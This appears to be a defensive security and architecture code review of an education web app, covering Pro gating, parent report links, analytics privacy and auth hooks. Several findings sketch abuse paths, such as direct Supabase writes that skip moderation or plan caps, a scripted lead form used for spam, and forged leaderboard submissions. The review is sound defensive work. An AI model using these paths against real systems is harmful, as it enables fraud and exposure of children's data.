**`fe-next/components/teacher/assignments/WordGoalFields.tsx:32-39`**. **Severity: low. This is a trust-boundary issue.**

**Failure scenario**
1. The HTML `min` and `max` attributes are not enforced while the teacher types.
2. `Number(value) || DEFAULT` accepts 99999 or a negative number.
3. Clearing the field snaps it back to the default, which makes the number awkward to edit.
4. If neither `AssignmentCreator` nor the server clamps the value, students get an assignment they can never complete, and it counts as "overdue" forever.

**Fix.** Clamp to `[WORD_COUNT_MIN, WORD_COUNT_MAX]` both here and on the server or in an RPC. Keep the raw string in state while the teacher edits, and clamp on blur or submit.

## 9. The quick-launch intent validator is looser than its own contract
**`fe-next/components/teacher/dashboard/quickLaunchIntent.ts:57-67, 98-99`**, consumed by `hq/EducationRouteLoading.tsx:8-9`. **Severity: low.**

**What the header promises.** The file header says that a blob that doesn't fully describe a launch should read as no intent.

**Where the code falls short**
- A `paste` intent with 1 word passes, although `MIN_PASTED_WORDS = 3`.
- Arrays of non-strings, or arrays longer than `MAX_PASTED_WORDS`, also pass. These would reach a socket payload that the file says caps at 500.
- A `createdAt` in the future, from clock skew or a tampered value, gives a negative age and never expires.

**Effect on page loads.** `EducationRouteLoading` renders the full-screen, z-130 "Going live" stage whenever an unexpired intent exists. The earlier review found that an abandoned launch can leave the intent uncleared. For up to 5 minutes after that, every education-route load flashes a fake launch screen.

**Fix**
- In `isCompleteIntent`, require `words.every(w => typeof w === 'string')` and `MIN_PASTED_WORDS <= length <= MAX_PASTED_WORDS`.
- Reject a `createdAt` greater than `now`.
- Have the express runner clear the intent on abandon or fail, not only on success.

---

**Priority.** Fix #1 first, because it is the only one that can cost a paying customer money. Then #2 and #3: they make the report teachers are being asked to pay for show wrong numbers. #4 and #5 are the scale and authz items to settle before more classes are onboarded.

## Shard 19

# Senior review: teacher HQ, lesson library and Pro components (findings the previous pass missed)

**Scope.** I read only the files in this batch. The server routes, RLS policies, `libraryClient`, `parentLinks` and the parent components that own these widgets are not visible. Wherever a finding depends on them, I say what to verify.

**Excluded.** I left out everything the previous pass already reported:
- `useClassRoster` first-read hang
- Ctrl+Enter double save
- clipboard error toast
- `HqProjectorSheet` `onClose` deps
- `ProPlanPanel` canceled-with-no-date

Nine findings, most severe first.

---

## 1. Discover moderation and ranking are enforced only in the browser (trust boundary, UGC shown to other teachers' classes)
**Severity: High (if the server doesn't re-check).**

**Where:**
- `fe-next/components/teacher/lesson-creation/ListEditorSheet.tsx:83,133`
- `MyListCard.tsx:121-132`
- `library/useDiscoverLibrary.ts:26-29`
- `library/DiscoverPanel.tsx:68`

**What I can see:**
- `listModerationIssues` is the only moderation check in this code. It runs inside the editor's `handleSave` and nowhere else.
- The card's share toggle (`MyListCard.tsx:124`) calls `onToggleShare` directly. Nothing in this file runs moderation on that path.
- Ranking is `5 + copyCount*3 + playCount`. Any teacher list therefore outranks every verified list (score 4).
- The copy counter is bumped optimistically on the client (`DiscoverPanel.tsx:68`).

**Failure scenario:**
1. A teacher, or a throwaway teacher account, creates a list with offensive words.
2. They publish it through the card toggle, or by calling Supabase directly with `update lessons set is_public=true`. Either way skips the editor check.
3. The list appears in Discover for every teacher in that language. It sorts above all verified packs even at 0 plays.
4. If `copy_count` and `play_count` are writable by the client, or by an RPC with no per-user dedupe, a second account inflates the count. Three copies add 9 points, so the list stays on top.
5. Another teacher taps **Host** and projects the list to a room of children.

**Fix:**
- Enforce moderation on the server whenever `is_public` changes to true. Use a trigger or security-definer RPC, and block direct `is_public` updates in RLS.
- Increment counters only through an RPC keyed on `(lesson_id, user_id)`, so each teacher counts once.
- Don't give teacher lists a base score above verified packs until they have real plays.
- **Verify the current RLS on `lessons.is_public` today.**

---

## 2. Parent pack can hand class A's report links to class B's parents
**Severity: Medium-High (privacy of minors).**

**Where:** `fe-next/components/teacher/pro/ParentReportPack.tsx:46-70, 113`

**Failure scenario:**
1. The teacher selects class A and clicks **Make**. The POST is in flight.
2. The class `<select>` isn't disabled while `busy`, so the teacher switches to class B. `setLinks(null)` runs (line 113).
3. The class A response arrives. `setLinks(body.links)` fills the list with A's students under a picker that now says B. Nothing checks which class the response belongs to.
4. The teacher clicks **Copy all** (`parentLinksToText`) and pastes it into class B's parent group chat.
5. Parents of class B now hold working report links for class A's children until `PARENT_LINK_DAYS` runs out. This UI has no way to revoke them.

**Fix:**
- Capture `const requested = classId` at the start of `make`, and drop the response if `requested !== classId`.
- Disable the select while `busy`.
- Show `className` above the link list.
- Add a "revoke all links for this class" action on the server.

---

## 3. Word lists have no size limit anywhere in the authoring path
**Severity: Medium (availability and abuse, breaks at 10x).**

**Where:**
- `fe-next/components/teacher/lesson-creation/BulkImportEnhanced.tsx:185-229, 256-266`
- `ListImportBar.tsx:30-34`
- `ListEditorSheet.tsx:216-221`

**Failure scenario:**
1. A teacher drops a 5 MB CSV, or pastes a long glossary of tens of thousands of lines. `readAsText` and `file.text()` read the whole file with no size check.
2. `validationResults` reruns `checkWordIntegration` for every line on every keystroke in the textarea. With tens of thousands of lines, the tab freezes.
3. If the import goes through, the whole array is saved into the lesson's words column.
4. When that lesson is hosted, the vocabulary goes into the Redis game record and to every client. The previous pass noted that full game records are broadcast. One oversized lesson then slows the game server for everyone on it.

**Fix:**
- Cap files at about 256 KB and lists at about 500 words, and show a clear error when either is exceeded.
- Debounce validation.
- Add a server-side `CHECK (jsonb_array_length(words) <= N)`, or validate in the lesson API.

---

## 4. Roster polling multiplies with every open screen
**Severity: Medium (cost at the next 10x).**

**Where:**
- `fe-next/components/teacher/hq/useClassRoster.ts:50-54`
- `HqProjectorSheet.tsx:33-36`

**What happens:**
- Every component that uses `useClassRoster` starts its own 15-second `setInterval`. Each tick refetches the full roster joined with `profiles`, including `avatar_config` JSON.
- The projector sheet mounts a second instance for the same class while the "Get students in" card is already polling.
- A projector tab stays visible all lesson, so the visibility check doesn't stop it.

**Arithmetic:** 1,000 teachers with HQ and the projector open produce about 130 roster joins per second. That load is constant even when nobody is joining.

**Error handling:** after the first successful read, a failing endpoint is retried every 15 seconds forever with no backoff. The UI keeps showing the stale roster and never says the data is out of date.

**Fix:**
- Share one cache per `classroomId`, for example with SWR or a module-level store.
- Better: subscribe to Supabase Realtime inserts on the membership table, or poll only a cheap `count` or `max(joined_at)` and refetch the roster when it changes.
- Back off on errors.

---

## 5. Discover downloads and searches the entire library in the browser
**Severity: Medium (breaks at 10x).**

**Where:** `fe-next/components/teacher/lesson-creation/library/useDiscoverLibrary.ts:76-91, 117-119`

**What happens:**
- `fetchDiscover(language)` returns `items` with their full `words` arrays.
- Search (including word contents), sort and pagination all run on the client (`filterItems`, `sortItems`, `paginate`).

**Failure scenario:**
1. Discover opens and fetches every shared list in that language, word lists included. That is fine at 200 lists.
2. At 10x, with thousands of shared lists of up to hundreds of words each, the payload is several MB per open and again on each language switch.
3. If `fetchDiscover` caps the response on the server (I can't see it), the "Popular" and "Newest" sorts and the search run over only that truncated slice. New lists then never appear.

**Fix:**
- Move filtering, sorting and pagination to the server: an RPC with `limit`/`offset`, a trigram or tsvector search, and a precomputed `rank` column.
- Return only metadata and a word sample for cards, and load full words when the preview opens.

---

## 6. ProPlanPanel says "renews" to teachers who have cancelled
**Severity: Medium (billing trust and chargebacks).**

**Where:** `fe-next/components/teacher/pro/ProPlanPanel.tsx:9-16, 33-38`

**Failure scenario:**
1. A teacher cancels in the Polar portal. Polar keeps `status: 'active'` with `cancel_at_period_end: true` until the period ends.
2. The component has no `cancelAtPeriodEnd` prop, so it falls through to `eduPlans.manage.renews`: "Renews on 14 March, $9".
3. The teacher believes the cancellation failed, emails support, or files a dispute.
4. The same fall-through shows "renews" or "active" for `unpaid`, `incomplete` and any other unknown status.

The previous pass flagged this in `SubscriptionStatusCard` and the canceled-with-no-date case, not here.

**Fix:**
- Add a `cancelAtPeriodEnd` prop.
- Show `renews` only when `status === 'active' && !cancelAtPeriodEnd`.
- Map `canceled` or cancel-at-period-end to `ends`, and send every other status to a neutral "contact billing" line.

---

## 7. A saved new list never learns its id, so the editor keeps treating it as unsaved
**Severity: Low-Medium (data integrity).**

**Where:** `fe-next/components/teacher/lesson-creation/ListEditorSheet.tsx:44, 79-81, 137-140`

**Root cause:** `onSave` returns `Promise<boolean>`, so the sheet structurally can't learn the id the parent just created.

**Failure scenario:**
1. A teacher creates a new list and clicks **Save**. It succeeds and `saved` becomes true, but `draft.id` stays undefined.
2. The button is enabled again (`saving` is false). A second click, or any edit followed by Save, inserts a second list. This is a different path from the shortcut double-press already reported.
3. While the sheet stays open, the effect at lines 79-81 (`open && !draft.id`) keeps sending the already-saved list to `onDraftChange`. That is the "resurrected draft" mechanism the previous pass couldn't confirm.

**Fix:**
- Change `onSave` to return `{ ok, id }`.
- On success call `setDraft(d => ({ ...d, id }))`, which stops the autosave effect.
- Clear the persisted draft at the same time.

---

## 8. The class join code on the projector is a permanent credential
**Severity: Medium (verify).**

**Where:**
- `fe-next/components/teacher/hq/HqProjectorSheet.tsx:54, 107-125`
- `StartLiveClassCta.tsx:54-62`

**Failure scenario:**
1. The teacher shows `classroom.join_code` and a QR code at back-row size.
2. A student photographs it and posts it online.
3. Strangers join. The previous pass found that guest join mints anonymous accounts without validating first or rate limiting. Joined users can read the named roster through the miss-gap route.
4. The only thing that removes them is the teacher noticing unfamiliar names in the seats, or rotating the code if that is possible. Nothing in these files offers rotation or locking.

**Fix:**
- Add a "lock class" or "rotate code" control next to the projector.
- Expire join links, or require teacher approval once the class has been active for a while.
- **Verify whether the server already supports rotation.**

---

## 9. Parent pack: bare `fetch` with no bearer token, and a class load with no error path
**Severity: Low.**

**Where:** `fe-next/components/teacher/pro/ParentReportPack.tsx:32-39, 52-56`

**Failure scenario:**
1. The POST to `/api/teacher/pro/parent-links` sends cookies only. The previous pass documented elsewhere in the codebase that the cookie session can be stale while the browser client has refreshed.
2. A paying teacher then gets a 401, which is shown as the generic "failed" message, not "needs Pro" and not "sign in again". The feature they pay for looks broken.
3. Separately, `getClassrooms(...).then` has no `.catch` and ignores `error`. On failure, `classes` stays `null`, and the UI renders an empty select with a disabled button and no explanation.

**Fix:**
- Send the request through the same `fetchWithAuth`/`authedPost` helper used elsewhere.
- Handle `401` explicitly.
- Read `error`, add `.catch`, and show a retry when the class load fails.

---

**Recommended order:** fix #1 and #2 first. They are the only items where a child's data or a child's screen is at stake. #6 is the cheapest fix that protects revenue.

## Shard 20

# Senior review: what the previous pass missed

**Scope:** the teacher Pro, upgrade and reports components shown here (`components/teacher/pro/*`, `report/*`, `reports/*`).

**Excluded:** everything the earlier report already covered. That includes the parent-share print leak, the UTC "last active" bug, the empty `teacherId` in ClassArcPanel, the print CSS collision, and the Google course-switch race.

**Confidence:** I couldn't see the API routes or the `lib/` helpers. Findings that depend on them are marked **verify**. Seven findings, highest severity first.

---

## 1. The public school-lead form may let anyone send mail from your domain (verify)

**Where:**
- `fe-next/components/teacher/pro/SchoolQuoteForm.tsx:17, 40-55, 93, 109`
- The `maxLength` caps at `:115, 119, 123, 156` are client-side only.

**Failure scenario:**
1. `/api/education/school-lead` is an unauthenticated POST. It takes `email`, `fullName`, `school`, `message` (600 characters) and `requester`, all chosen by the caller.
2. The success screen says `successBody, { email: sentTo }` (`:93`). That implies the server sends a confirmation to the submitted address. It probably also notifies you.
3. An attacker scripts the endpoint. They set `email` to a victim's address and put a link or abusive text in `message`, `fullName` or `requester`. The client caps don't apply to a direct POST.
4. Your sending domain now delivers attacker content to arbitrary inboxes. Spam complaints damage the domain's reputation. Your trial-day-10 and trial-expiry emails, which are the conversion emails, then start landing in spam.
5. Separately, `requester` comes in as a prop and is rendered as "{name} asked you to…" (`:109`). If it comes from a shareable URL param, anyone can put words in a fake colleague's mouth on `lexiclash.live`.

**Severity:** High if the server echoes user fields into an outbound email, or sends mail to the submitted address without rate limiting. Low otherwise.

**Fix:**
- Rate-limit by IP and by email on the route.
- Add a honeypot field or Turnstile.
- Never include `message`, `fullName` or `requester` in mail sent to the submitter. Send a fixed template, or nothing.
- Validate and cap all fields on the server.
- Clamp `requester` to about 40 characters and strip URLs before rendering it.

---

## 2. Grade passback would write wrong official grades into Google Classroom

**Where:**
- `fe-next/components/teacher/reports/AssignmentProgressReport.tsx:76-84`. The comment there says the on-screen score and the pushed Google grade come from one helper, `mapProgressRowToCompletion`, which derives the percentage from `words_attempted`.
- `GoogleClassroomGradePassback.tsx:195-198`
- Root cause, found earlier but never connected to grades: `lib/supabase/education/progress.ts:127`. There, `correct` is a streak counter that resets to 0 on a wrong answer.

**Failure scenario:**
1. A student answers a word right, right, right, then wrong. The stored data becomes `attempts: 4, correct: 0`.
2. `mapProgressRowToCompletion` turns `words_attempted` into a percentage. If it uses `correct / attempts` (**verify**), that word scores 0%.
3. The teacher clicks "Send grades". The push writes the low score into the Google Classroom gradebook, and with `returnGrades` checked, it is returned to students and visible to parents.
4. A wrong number on a dashboard is an annoyance. A wrong grade in a school's system of record is the kind of mistake that ends a teacher's trust and their subscription.

**Severity:** High once `isGradePassbackUiEnabled()` is turned on. Today it is behind a flag that is off by default.

**Fix:**
- Keep the flag off until progress stores a lifetime `totalCorrect` field next to the streak.
- If you need the feature sooner, push only a completion grade (completed equals full points). Don't derive an accuracy grade from the current field.

---

## 3. Pro features are gated in the browser, on data free teachers already receive

**Where:**
- `AssignmentProgressReport.tsx:45-88, 92-106, 124-144`
- `ExportAllClassesButton.tsx:27-30, 60`
- `MasteryLockedTeaser.tsx:17`. Its comment says "blur is not a security boundary", but whether the full report reaches the client depends on `useWordMasteryReport`.

**Failure scenario:**
1. A free teacher opens the reports page. `load()` fetches every student-by-assignment row into the browser, whatever the plan.
2. The Pro check only decides whether `exportCsv` gets a button (`:124`). The CSV is built entirely client-side from `data.rows`. Any script, browser extension or copy-paste gets the same output.
3. `ExportAllClassesButton` runs `getTeacherExportRows(user.id)` as a client Supabase query. `ProGate` is a React wrapper, so nothing on the server checks the plan before the query runs.
4. Today the revenue lost is small. But "reports and exports" is the main thing the Pro card sells. Once a sharing teacher posts "here's how to get the export free", it scales with your user base, not with effort.
5. Contrast: the grade-passback and missed-practice routes return `not_pro` from the server (`GoogleClassroomGradePassback.tsx:98`). The pattern exists in the codebase and just isn't applied here.

**Severity:** Medium (revenue leakage).

**Fix:**
- Move the exports behind server routes, such as `/api/education/reports/export`, that check the subscription with the service role and stream the CSV.
- For the mastery teaser, have the API return only the top 3 rows to free teachers, and confirm it does today.
- Accept that the on-screen table is free, and gate the artifact (the download), not the button.

---

## 4. Report data loads fan out N+1 per assignment, and may refetch on every render

**Where:**
- `ClassroomRosterProgress.tsx:93-97, 106`
- `AssignmentProgressReport.tsx:46-49, 55`
- `ClassAssignmentGrid.tsx:42-45, 51`
- `AssignmentCompletionReport.tsx:31`
- `load` depends on `t` at `ClassroomRosterProgress:149`, `AssignmentProgressReport:88`, `ClassAssignmentGrid:89` and `AssignmentCompletionReport:38`.

**Failure scenario:**
1. Each of three components calls `Promise.all(assignments.map(a => getAssignmentCompletions(a.id)))`, which has no concurrency limit.
2. Each also re-fetches the same classroom assignments and student list.
3. Take a class with 40 assignments on a report view where these components mount together. That is about 3 × (2 + 40) ≈ 126 requests on page open, per teacher.
4. At 10x teachers during the school-morning peak, this is the query pattern that hits Supabase connection and rate limits first. If any one of the 40 requests errors, that component fails as a whole (`firstErr`), so the result looks like flaky reports.
5. The amplifier: `TeacherProGrantPanel.tsx:63-64` documents that "the language context hands out a fresh `t` per render". If `useReportData` refetches when `load` changes identity (**verify**), each component re-runs its whole fan-out on every render: a request storm at 1x, not just at 10x.
6. Related: if `getStudentsProgressSummary` (`:95`) reads `student_lesson_progress` without paging, a class of 50 students with 20 or more lessons exceeds the default 1000-row PostgREST cap. Students past the cap then silently show "never" active.

**Severity:** Medium now. High at 10x, or immediately if the `t` refetch is real.

**Fix:**
- Add one RPC per classroom, for example `classroom_assignment_matrix(classroom_id)`, that returns students, assignments and completions in one query.
- Share the result across the four components through a query cache keyed by `classroomId` (react-query or SWR).
- Take `t` out of the `load` dependencies. Do the translation at render time, not inside the fetch.

---

## 5. The "Assign follow-up" retry creates duplicate lessons after a partial failure

**Where:** `ClassArcPanel.tsx:92-105, 167-196`

**Failure scenario:**
1. The teacher clicks "Assign follow-up". `createLessonAndAssign` creates the lesson, then the assignment insert fails (network blip, RLS error, or the free-tier assignment cap).
2. The result is `success: true, assigned: false`, so line 105 sets `'failed'`.
3. The button is shown again because `status !== 'done'`. The teacher clicks it, a second identical lesson is created, and the assignment is attempted again.
4. Each retry leaves another orphan "Follow-up — {class} — {date}" lesson in the teacher's library.
5. The flow is a non-transactional two-step write, with no idempotency key and a UI that retries the whole thing.

**Severity:** Medium (data integrity, and clutter in front of paying teachers).

**Fix:**
- When `success && !assigned`, keep the returned lesson id and retry only the assignment step.
- Better: make it a single server RPC that creates the lesson and the assignment in one transaction. Add an idempotency key, such as a hash of classroom, local date and the sorted word list, enforced by a unique index.

---

## 6. Google Classroom course work can be duplicated in the school's real system

**Where:** `GoogleClassroomGradePassback.tsx:168-189, 288`

**Failure scenario:**
1. The teacher clicks "Create course work". The server creates it in Google Classroom, then the response is lost (timeout, 5xx after the Google call, or a Wi-Fi drop).
2. The `catch` at `:183-185` shows a generic error, and the new item is never added to `courseWork`.
3. The teacher clicks again, and a second assignment is posted. Google Classroom notifies every enrolled student about each one. These duplicates live outside your system, and the teacher has to clean them up by hand.
4. Related: `open()` (`:125-131`) ignores `assignRes.error`. If the assignment read fails, the lesson list is empty, Send is permanently disabled, and no message explains why.

**Severity:** Medium-low, because the flag is off. It becomes visible to students as soon as the flag is on.

**Fix:**
- Send an idempotency key (`classroomId`, `lessonId`, `courseId`) to `/coursework`. Have the server store it and return the existing course work id on a repeat.
- On a client error, re-list course work before allowing another create.
- Surface `assignRes.error` in `open()`.

---

## 7. A conversion telemetry event records Pro teachers as free

**Where:** `AssignmentCompletionReport.tsx:28, 43-51`

**Failure scenario:**
1. `useTeacherPro()` resolves after the report data, which happens on a cold cache or a slow entitlement read.
2. The effect fires `trackTeacherAssignmentReportViewed({ hasPro: false })` and locks `viewed.current = true`.
3. When `hasPro` flips to true, the event never fires again.
4. Paying teachers are recorded as free viewers. That inflates the free-tier engagement numbers and deflates the Pro ones, which are the numbers you'd use to judge whether reports drive upgrades.

**Severity:** Low (analytics integrity on a funnel metric you will make pricing decisions from).

**Fix:** add `if (proLoading) return;` to the effect guard, and add `proLoading` to its dependencies.

---

## Suggested fix order

1. **#1.** Confirm what the school-lead route sends. If it sends anything, this is a one-hour fix that protects the deliverability of your conversion emails.
2. **#2.** Keep the flag off.
3. **#3** and **#4**. Both point to the same refactor: a server-side report and export route backed by one RPC.

## Shard 21

# Senior review: report, setup, and auth files the previous pass skipped

**Scope.** I read the files included in this batch: `components/teacher/reports/*`, `components/teacher/setup/*`, `contexts/AuthContext.tsx`, `contexts/auth/authUtils.ts`, and the smaller UI files. I did not repeat anything the earlier shards already reported. That covers PDF revoke timing, the `averageRating.toFixed` crash, the class-create double-tap, the `names` memo, and the Classroom grade-passback race.

**What I could not see.** I did not have the API routes, `syncAuthAnalyticsTransition`, `consumePendingInviteRef`, or the Supabase analytics library. Where a finding depends on one of them, I say so.

**Priority.** The two child-safety and privacy findings (#1 and #2) matter most for an education product that sells to schools.

---

## 1. "Assign practice to Maya" sends no student id, so it probably goes to the whole class — High (privacy and correctness)

**Where:** `fe-next/components/teacher/reports/StudentPracticeAction.tsx:73-81`

**Failure scenario:**
1. A teacher opens a student's arc in `StudentArcView`. `StudentPracticeAction` renders "Assign practice for {name}".
2. The teacher clicks it. The client builds round names such as "Maya – practice 1 – 14/03" (`:73-75`).
3. It POSTs `{ today, names, words }` to `/api/education/classroom/${classroomId}/missed-practice`. This is the same classroom-scoped endpoint the class-level `MissedPracticeAction` uses (`WordMasteryReport.tsx:95`).
4. The body has **no `studentId`**, so the server has nothing to scope the assignment to one student. Whatever the route does, it is one of these:
   - **It assigns to every student in the class.** Every child then sees assignments named after Maya, containing Maya's weak words. That discloses a minor's performance to classmates.
   - **It ignores `words` and uses class-wide misses.** The button then does not do what it says.
   - **It dedupes per classroom per day.** The 409 at `:83` means the teacher can do this for only one student per day. The second student gets "already assigned".

**Fix:**
- Send `studentId` from the arc's props and make the route assign only to that `student_id`.
- Validate server-side that `words` is a subset of that student's actual misses.
- Key the 409 dedupe on `(classroom, student, day)`.
- Don't trust the client's `today` (`:80`). Derive the day server-side from the classroom's timezone.

## 2. Invite-link auto-friend runs at signup, before age gating exists — High (child safety, trust boundary)

**Where:** `fe-next/contexts/AuthContext.tsx:153-177`

**Failure scenario:**
1. An adult sends a child the link `lexiclash.live/?ref=adultusername`, and the ref is captured.
2. The child signs up. On the guest-to-authenticated flip, `consumePendingInviteRef` immediately calls `friendsApi.searchUsers` and then `sendFriendRequest` on the child's behalf.
3. This runs before any `birth_year` is collected. A new profile has none. So the Families-policy social tier (`social_features_override`, `friendManagement`) has not yet been computed. The child never chose to send that request.
4. The lookup goes through **search**, not an exact-username lookup. A prefix or fuzzy match can send the request to a different user.

**Fix:**
- Resolve the ref with an exact, case-normalized username lookup on the server.
- Defer the friend request until the age screen has run and `friendManagement` is allowed.
- Enforce the social-capability check inside the friend-request API itself, not only in the UI. I couldn't see whether `sendFriendRequest` checks it, so verify that it does.

## 3. Student emails and real names are sent to third-party analytics — Medium-High (COPPA, FERPA, Families policy)

**Where:** `fe-next/contexts/AuthContext.tsx:103-122`

**Failure scenario:**
1. A student signs in through a classroom with a school Google account.
2. `setSentryUser(user, profile)` runs.
3. `setAnalyticsIdentity(user.id, display_name)` stamps the real name onto every analytics event (comment at `:104-105`).
4. `syncAuthAnalyticsTransition` is passed `email: user.email`, which presumably goes to PostHog `identify`.
5. The result is that the email and name of a minor sit in two US third-party processors. Your own Families-policy work implies these users can be children. A district privacy review or a Play Families review will ask about this.

**Fix:**
- Identify by `user.id` only.
- Drop `email` and `displayName` from analytics whenever `user_role === 'student'`, or when the user is under 13 or the age is unknown.
- In Sentry, send `id` only.
- If you need names in the admin game log, join them server-side from `profiles` at read time.

## 4. The Pro PDF export cannot be enforced, because it is built entirely in the browser — Medium (revenue)

**Where:** `fe-next/components/teacher/reports/StudentProgressReport.tsx:39-63`, `downloadReportPdf.tsx:20-31`, `ReportChrome.tsx:175-198`

**Failure scenario:**
1. `StudentProgressReport` gets its data from `getStudentReportData`. That is a client-side Supabase query under the teacher's own RLS.
2. It renders the export button with a hard-coded **PRO** badge. **Nothing in the component checks `hasPro`.**
3. The PDF builder (`ProgressReportPDF`) ships to every client.
4. Whether or not a parent wraps this screen in `ProGate`, a free teacher can render the component or call the builder and get the "Pro deliverable".

**Contrast:** `WordMasteryReport` does this correctly. The server returns 402 with a reduced preview, and the comment at `:27-28` says so.

**Fix:** Pick one approach and apply it consistently:
- Move the full report payload behind an API route that checks entitlement, using the same pattern as word-mastery. Free teachers then never receive the deep data.
- Or accept that the PDF is a client-side convenience and stop selling it as a Pro gate.

At minimum, add a `hasPro` check in `StudentProgressReport`.

## 5. Allowlist consumption fires on every cold session load and fails silently — Medium (scale and failure handling)

**Where:** `fe-next/contexts/AuthContext.tsx:150-152`, together with the comment at `:143-146`

**Failure scenario:**
1. `wasAuthenticatedRef` is in-memory only. Every tab open or reload by a signed-in user counts as a "guest to authed" flip. The comment at `:143-146` admits this.
2. So every authenticated session start in every tab sends `POST /api/education/consume-allowlist`. At 10x users this is pure write traffic against a table that almost never has a match.
3. The call is a bare `fetch` with no bearer token, and `.catch(() => {})` swallows every error. A non-2xx response doesn't even reach the catch.
4. Shard 21 notes that cookie sessions can be stale. When that happens this returns 401. A teacher who was pre-approved never gets promoted, and nothing records it.

**Fix:**
- Call it once per user: gate on `user.created_at` being recent, or set a `localStorage` flag per user id.
- Use `fetchWithAuth`.
- Log non-OK responses.
- Better still, consume the allowlist server-side in the auth callback or a Supabase auth hook.

## 6. One-tap "Share" broadcasts a named list of struggling students — Medium (data protection by design)

**Where:** `fe-next/components/teacher/reports/ReportShareActions.tsx:32-36, 50-57`

**Failure scenario:**
1. The teacher taps Share on the mastery report.
2. `buildReportSummary` adds a line such as "Need help (below 80%): Maya Cohen, Tom Levi". It uses full roster names from `useRosterNames`.
3. `navigator.share` sends that to whatever app the teacher picks, typically a parents' WhatsApp group.
4. That group now holds the names of below-goal minors alongside the class name. There is no confirmation step, and the text gives no hint that it contains named data.

**Fix:**
- Default the summary to counts only, such as "3 students need help".
- Put names behind an explicit "include student names" toggle, or limit them to the print and PDF path the teacher controls.

## 7. Class setup ignores loading states, so a paying teacher sees the upsell or creates a duplicate class — Medium (revenue UX and data integrity)

**Where:** `fe-next/components/teacher/setup/ClassSetupFlow.tsx:51-54, 61-65`

**Failure scenario:**
1. **Upsell shown to a Pro teacher.** A Pro teacher with 3 or more classes taps Create while `useTeacherPro` is still loading. `hasPro` is false at that moment, so `isFreePlanUsageBlocked` (`:62`) opens `ClassLimitUpsellModal` for someone already paying. `cap` and `trialAskOpen` both check `proLoading`, but `submit` does not.
2. **Duplicate class from the "open existing" link.** A teacher follows `?classroomId=X` to show an existing class's code. Until `useClassrooms` resolves, `existing` is undefined, so step 1 (the create form) renders. Every field has a default, so a single tap creates a new class named "Class N+1". That uses up a free-tier slot and produces a duplicate join code.

**Fix:**
- In `submit`, return early while `proLoading` or while classrooms are loading.
- When `requestedId` is set and classrooms are still loading, render a skeleton instead of the details form.

## 8. The OAuth fallback can make an email prefix a public display name — Low-Medium (PII)

**Where:** `fe-next/contexts/auth/authUtils.ts:63-65`

**Failure scenario:**
1. A provider returns no `full_name`, `name`, `global_name` or `preferred_username`.
2. `extractOAuthDisplayName` falls back to the email local part.
3. If the auto-create path uses this value (shard 20 describes `fetchUserData` auto-creating profiles), it becomes `display_name`.
4. That name appears on leaderboards and in `PlayerProfileTooltip`. School addresses such as `cohen.maya2014@…` expose a full name and birth year publicly.

**Fix:** Never derive a public name from an email address. Fall through to `fetchRandomPlayerName` instead.

## 9. A failed roster lookup silently anonymises the report and the shared summary — Low (failure handling)

**Where:** `fe-next/components/teacher/reports/useWordMasteryReport.ts:48-51`

**Failure scenario:**
1. `getClassroomStudents(...)` has no `.catch`, and it ignores the returned `error`.
2. On an RLS or network failure, the rejection goes unhandled and `rows` stays `[]`.
3. Every heatmap row, student card and "need help" entry then shows "Unknown student". The shared summary drops names without saying so.
4. The teacher sees a report that looks complete but in which no student can be identified, and gets no error or retry.

**Fix:** Destructure `{ data, error }` and add `.catch`. Expose a `namesFailed` flag, and show a small retry banner instead of silently falling back.

---

**Checked and found fine:**
- `downloadReportPdf` filename sanitising.
- `useReportData` stale-response guard.
- `classInsights` and `masteryHeatmapView` math.
- `ClassReady` QR and join URL.
- `PlayerProfileTooltip` link encoding.
- `TrainingProgressBar`.
- `RunProgressMeter`.

The parallax `BackgroundEvent` effect does not kill its GSAP timeline on unmount. That only wastes some performance, so I did not rank it.

## Shard 22

# Security and architecture review: auth, session and classroom hooks

This review covers the auth context hooks (`contexts/auth/*`) and the `hooks/*` files you supplied. It skips everything the previous pass already reported, including Shard 20's guest-claim ordering, stale responses in the classroom hooks, and the auth-listener leak in `useActiveClassroomGame`.

**Confidence labels:**
- **Confirmed:** provable from the code shown.
- **Verify:** depends on a server route or RLS policy I couldn't see.

---

## 1. New winners lose their daily result at signup (confirmed, High)

**Where:** `fe-next/contexts/auth/hooks/usePendingDailyResult.ts:80-91` against `:177-180`

**Failure scenario:**
1. A guest solves the daily puzzle. The result is stored as pending, with a `trigger`.
2. The guest signs up. `fetchUserData` calls `submitPendingDailyResult`. The new profile has `has_customized_profile === false`, and the guest never chose a name, so the code takes the `else` branch.
3. `setWinnerOnboarding(...)` runs. The comment says "DON'T clear the pending result yet", and the code returns.
4. `return` inside `try` still runs `finally`, so `clearPendingDailyResult()` wipes the result.
5. After onboarding, nothing is left to submit. `setWinnerOnboarding` stored only trigger, name and avatar, not the result.

The player who just won and converted gets no leaderboard entry, no rank toast and no `trackDailySignupRank`. This hits the highest-intent signup path you have.

**Fix:** Drop the unconditional `finally`. Clear the result explicitly on the success path and on a non-retryable server error, and skip clearing on the onboarding branch.

---

## 2. Daily-challenge submit: identity and result come from the client (verify, High if the server trusts them)

**Where:** `usePendingDailyResult.ts:100-136`

**Failure scenario:**
1. The POST body carries `playerId: userId` and `guestFingerprint: null`. The comment reads "Now authenticated, use player ID".
2. The body also carries `solved`, `attemptsUsed`, `targetWord` and every attempt's `feedback`, all read from localStorage.
3. No `Authorization` header is sent.
4. The body field for identity, plus a guest fingerprint for guests, suggests the route keys identity off the body. If so, anyone can post `{playerId: <victim>, solved: true, attemptsUsed: 1}` for any user. Guests are identified by a fingerprint the client generates.
5. If feedback is validated against the client-sent `targetWord`, a rank-1 result is one curl away.

The leaderboard and the "rank #1" brag cards are your viral loop, so forged results damage it directly.

**Fix:**
- On the server, derive the player from the session, using the same `getAuthedUser` the other routes use, and ignore `playerId` in the body.
- Recompute `feedback` and `solved` from the stored target for `puzzleDate` and `language`.
- Accept only today's and yesterday's puzzle dates.
- Add a unique `(puzzle_date, language, player_id)` constraint.

---

## 3. Monetisation caps and progress integrity depend on RLS the browser can bypass (verify, High for revenue)

**Where:**
- `fe-next/hooks/useClassroom.ts:9`: `createClassroomAPI` is still exported for browser use.
- `useClassroom.ts:205` and `:234`: classroom update and delete go straight from the browser to Supabase.
- `fe-next/hooks/useStudentProgress.ts:191`: the browser writes `student_lesson_progress` directly.

**Failure scenario:**
1. Classroom creation goes through `/api/education/classroom/create` "for enforcement" (line 147). The browser lib can still insert into `classrooms`.
2. If the RLS INSERT policy on `classrooms` allows teachers, a free teacher can open devtools and run `supabase.from('classrooms').insert(...)`. The 3-class cap and the main reason to buy Pro then disappear.
